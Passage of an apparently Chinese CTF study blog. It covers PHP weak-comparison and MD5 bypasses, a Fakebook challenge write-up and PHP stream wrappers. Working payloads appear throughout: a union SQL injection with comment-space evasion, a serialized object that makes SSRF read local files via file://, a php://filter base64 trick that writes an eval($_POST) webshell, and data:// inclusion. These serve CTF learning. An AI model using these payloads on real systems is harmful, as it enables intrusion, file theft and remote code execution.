class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var_dump(12==&quot;12&quot;)                                 //true</span><br><span class="line">var_dump(12==&quot;12aa&quot;)                               //true</span><br><span class="line">var_dump( &quot;admin&quot;==0)    //true</span><br><span class="line">var_dump(false==&quot;&quot;==0==NULL)//true</span><br><span class="line"></span><br><span class="line">var_dump(&#x27;a&#x27; == 0);    //bool(true)</span><br><span class="line">var_dump(&#x27;1a&#x27; == 1);//bool(true)</span><br><span class="line">var_dump(&#x27;12a&#x27; == 1);//bool(false)</span><br></pre></td></tr></table></figure></li></ul><h3 id="字符串和布尔型"><a href="#字符串和布尔型" class="headerlink" title="字符串和布尔型"></a>字符串和布尔型</h3><ul><li>布尔值true和任意字符串都弱相等，除了0和false，因为0也认为是bool false，true是不等于false的<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(true==&quot;hyuf&quot;)                   //true</span><br><span class="line">var_dump(True == 0);                 //bool(false)</span><br><span class="line">var_dump(True == &#x27;False&#x27;);             //bool(true)</span><br><span class="line">var_dump(True == 2);                 //bool(true)</span><br></pre></td></tr></table></figure></li></ul><h3 id="字符串”0”和科学计数法"><a href="#字符串”0”和科学计数法" class="headerlink" title="字符串”0”和科学计数法"></a>字符串”0”和科学计数法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$str1 = &quot;a&quot;;</span><br><span class="line">echo md5($str1);//0cc175b9c0f1b6a831c399e269772661</span><br><span class="line">var_dump(md5($str1) == &#x27;0&#x27;);//bool(false)</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">$str2 = &quot;s224534898e&quot;;</span><br><span class="line">echo md5($str2);//0e420233178946742799316739797882</span><br><span class="line">var_dump(md5($str2) == &#x27;0&#x27;);//bool(true)</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">$str3 = &#x27;a1b2edaced&#x27;;</span><br><span class="line">echo md5($str3);//0e45ea817f33691a3dd1f46af81166c4bool</span><br><span class="line">var_dump(md5($str3) == &#x27;0&#x27;);//bool(false)</span><br><span class="line">---------------------------------------------------------</span><br><span class="line">var_dump(&#x27;0e111111111111&#x27; == &#x27;0&#x27;);//bool(true) </span><br></pre></td></tr></table></figure><ul><li>开头前两个为0e，后面全部为数字的话，他们就会和字符串0相等的<br>1、第一条只是0开头，所以只能当普通字符串，结果为false<br>2、第二条0e后面全为数字，符合要求，结果为true<br>3、第三条虽然为0e，但是后面不全为数字，所以结果为false<br>4、数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较</li></ul><h3 id="strcmp-函数漏洞-php5-3之前"><a href="#strcmp-函数漏洞-php5-3之前" class="headerlink" title="strcmp() 函数漏洞 php5.3之前"></a>strcmp() 函数漏洞 php5.3之前</h3><ul><li>strcmp(s1,s2)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">当s1&lt;s2时，返回为负数 注意不一定是-1，测试结果是比较字符串长度</span><br><span class="line">当s1==s2时，返回值= 0</span><br><span class="line">当s1&gt;s2时，返回正数 注意不一定是1，测试结果是比较字符串长度</span><br><span class="line">如果两个字符串不同等，但是字符串长度相同，就比较从哪一位开始不同的，然后比较那一位的大小</span><br><span class="line">即：两个字符串自左向右逐个字符相比（按ASCII值大小相比较），直到出现不同的字符或遇&#x27;\0&#x27;为止。如：</span><br><span class="line">&quot;A&quot;&lt;&quot;B&quot; &quot;a&quot;&gt;&quot;A&quot; &quot;computer&quot;&gt;&quot;compare&quot;</span><br></pre></td></tr></table></figure></li><li>利用点：这里面只能比较字符串，不能比较数字等其他形式的参数，如果出现了其它参数，则会retrun null，有些题目就是利用这一点来进行和0的完成比较<br>一般使用<strong>数组</strong>来触发</li></ul><h3 id="MD5绕过"><a href="#MD5绕过" class="headerlink" title="MD5绕过"></a>MD5绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(MD5($_GET[&#x27;name&#x27;]) == MD5($_GET[&#x27;password&#x27;]))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">//name[]=1&amp;password[]=2</span><br><span class="line">PHP中md5()函数无法处理数组（会返回NULL）</span><br><span class="line">==的也可以用数组绕过</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>GET传入a和b要求a不等于b，且a和b的md5值相同,md5的绕过</p><ul><li>方法一：利用数组绕过，md5()不能处理数组，传入数组会返回null<br>payload如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure></li><li>方法二：在php中以“0e”开头的字符串都会以科学计数法来解析，而0的乘积都为0。所以构造md5加密后开头为0e的字符串即可<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>下面是强比较<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>方法一：数组绕过<br>payload：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>方法二：使用md5加密后两个完全相等的两个字符串绕过</li><li>md5无论是32位还是16位，都不可能不重复的表示所有信息，这种重复的例子就称为<strong>硬碰撞</strong>，有如下代码：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$s1 = $_GET[&#x27;a&#x27;];</span><br><span class="line">$s2 = $_GET[&#x27;b&#x27;];</span><br><span class="line">$s3 = $_GET[&#x27;c&#x27;];</span><br><span class="line">echo md5($s1),&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo md5($s2),&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo md5($s3),&quot;&lt;br/&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>payload:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br><span class="line">&amp;b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</span><br><span class="line">&amp;c=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br></pre></td></tr></table></figure>三个返回相同的md5值<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ea8b4156874b91a4ef00c5ca3e4a4a34</span><br></pre></td></tr></table></figure></li></ul><h3 id="双md5碰撞绕过"><a href="#双md5碰撞绕过" class="headerlink" title="双md5碰撞绕过"></a>双md5碰撞绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af</span><br><span class="line">md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064</span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure><h3 id="md5碰撞脚本"><a href="#md5碰撞脚本" class="headerlink" title="md5碰撞脚本"></a>md5碰撞脚本</h3><h3 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval() 函数"></a>intval() 函数</h3><ul><li>intval() 函数用于获取变量的整数值</li><li>通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值，intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</li><li>语法：<code>int intval ( mixed $var [, int $base = 10 ] )</code><br>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)</span><br><span class="line">如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)</span><br><span class="line">否则将使用 10 进制 (decimal)</span><br></pre></td></tr></table></figure>绕过方法：通过使用0x或者0开始的格式来绕过不相等的判断（像一些要先判断不相等再判断相等的题目）</li></ul><h2 id="极客大挑战-2019-BuyFlag-1"><a href="#极客大挑战-2019-BuyFlag-1" class="headerlink" title="[极客大挑战 2019]BuyFlag 1"></a>[极客大挑战 2019]BuyFlag 1</h2><ul><li><p>is_numeric() 函数用于检测变量是否为数字<br>利用：is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值</p></li><li><p>bp修改请求方式<br>右键，change request method</p></li></ul><p>{<br>  “registry-mirrors”: [“<a href="https://qlmy5iw9.mirror.aliyuncs.com"]">https://qlmy5iw9.mirror.aliyuncs.com&quot;]</a><br>}</p><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>先在user页面找到注入点no&#x3D; ，然后测试’发现可能存在sql注入，发现是数字型，继续测试到union select 1，2，3，4时出现提示<code>no hack ~_~</code>,使用fuzz字典测试注入点<br><img src="/img/200.png"><br>union select被过滤，<code>union/**/select</code>中代替空格，常规联合注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1 union/**/select 1,group_concat(data),3,4 from users</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:5:&quot;1.com&quot;;&#125; </span><br></pre></td></tr></table></figure><p>&#x2F;robots.txt显示&#x2F;user.php.bak，查出源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function get($url)</span><br><span class="line">&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">    $output = curl_exec($ch);</span><br><span class="line">    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">    if($httpCode == 404) &#123;</span><br><span class="line">        return 404;</span><br><span class="line">    &#125;</span><br><span class="line">    curl_close($ch);</span><br><span class="line"></span><br><span class="line">    return $output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这部分可能存在ssrf,而我们爆出的字段data是序列化后的字符串,说明注册时会序列化我们的信息，回显到页面时再反序列化<br><img src="/img/201.png"><br>这里存在ssrf，data本来回显的是我们自己的博客，但我们把它改为回显flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>改为file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php，并把对应的s改为对应长度29<br>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;123&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>查看同一位置的源码，base64解码</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/php%E4%BC%AA%E5%8D%8F%E8%AE%AE.html"/>
      <url>/php%E4%BC%AA%E5%8D%8F%E8%AE%AE.html</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>PHP伪协议:是php支持的协议和封装协议。<br>协议:是通信双方的约定<br>封装协议:是在实际的数据通信系统中通过对协议的不同的加密方式，实现双方连接</p><h1 id="php支持的伪协议"><a href="#php支持的伪协议" class="headerlink" title="php支持的伪协议"></a>php支持的伪协议</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 file:// — 访问本地文件系统</span><br><span class="line">2 http:// — 访问 HTTP(s) 网址</span><br><span class="line">3 ftp:// — 访问 FTP(s) URLs</span><br><span class="line">4 php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">5 zlib:// — 压缩流</span><br><span class="line">6 data:// — 数据（RFC 2397）</span><br><span class="line">7 glob:// — 查找匹配的文件路径模式</span><br><span class="line">8 phar:// — PHP 归档</span><br><span class="line">9 ssh2:// — Secure Shell 2</span><br><span class="line">10 rar:// — RAR</span><br><span class="line">11 ogg:// — 音频流</span><br><span class="line">12 expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure><h1 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h1><p>allow_url_fopen off&#x2F;on<br>allow_url_include off&#x2F;on<br>php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行，从而任意文件读取<br>协议参数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure><p>使用的convert.base64-encode，就是一种过滤器<br>具体一些过滤器请参照本文参考文章：<br><a href="https://blog.csdn.net/cosmoslin/article/details/120695429">https://blog.csdn.net/cosmoslin/article/details/120695429</a><br><strong>过滤器嵌套</strong><br><code>php://filter/read=convert.base64-encode/index/resource=flag</code>,因为要读取，所以是read&#x3D;过滤器（convert.base64-encode），后面用&#x2F;隔开index，index是过滤器吗，但是可以嵌套,绕过这样的白名单，实现flag的读取，这里后面会自动加上.php所以不需要加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($file))</span><br><span class="line">&#123;</span><br><span class="line">    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">        include ($file . &#x27;.php&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="死亡exit"><a href="#死亡exit" class="headerlink" title="死亡exit"></a>死亡exit</h2><p>死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);</span><br><span class="line">或者</span><br><span class="line">file_put_contents($content, &#x27;&lt;?php exit();?&gt;&#x27; . $content);</span><br><span class="line">PHP file_put_contents() 函数：语法int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</span><br><span class="line">参数：filename 必需，规定要写入数据的文件。如果文件不存在，则创建一个新文件</span><br><span class="line">      data 必需，规定要写入文件的数据。可以是字符串、数组或数据流。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>$content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了。那么这种情况下，如何绕过这个“死亡exit”？</p><p>思路其实也很简单我们只要将content前面的那部分内容使用某种手段（编码等）进行处理，导致php不能识别该部分就可以了。<br>这里的<code>$_POST[‘filename’]</code>是可以控制协议的.<br>这里就介绍一种绕过，即我们刚学的php:&#x2F;&#x2F;filter配合base64编码：</p><h2 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先我们需要清楚的是base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码</span><br><span class="line">那么当$content被加上了&lt;?php exit; ?&gt;以后，我们可以使用php://filter/write=convert.base64-decode来首先对其解码。在解码的过程中，字符&lt; ? ; &gt;空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有”phpexit”和我们传入的其他字符。</span><br><span class="line">由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，这个时候后面再加上编码后的一句话木马，就可以getshell了。</span><br><span class="line">payload:</span><br><span class="line">?filename=php://filter/convert.base64-decode/resource=xxx.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</span><br><span class="line">a后面的编码实际上就是一句话木马</span><br><span class="line">死亡exit具体参考：https://blog.csdn.net/woshilnp/article/details/117266628</span><br></pre></td></tr></table></figure><p>这里有个疑问，为什么exit那段代码解码后会改变，而我们传入的编码后的一句话解码后为正常php代码</p><h1 id="data"><a href="#data" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h1><p>allow_url_fopen on<br>allow_url_include on<br>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。<br>示例用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、data://text/plain,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line"> </span><br><span 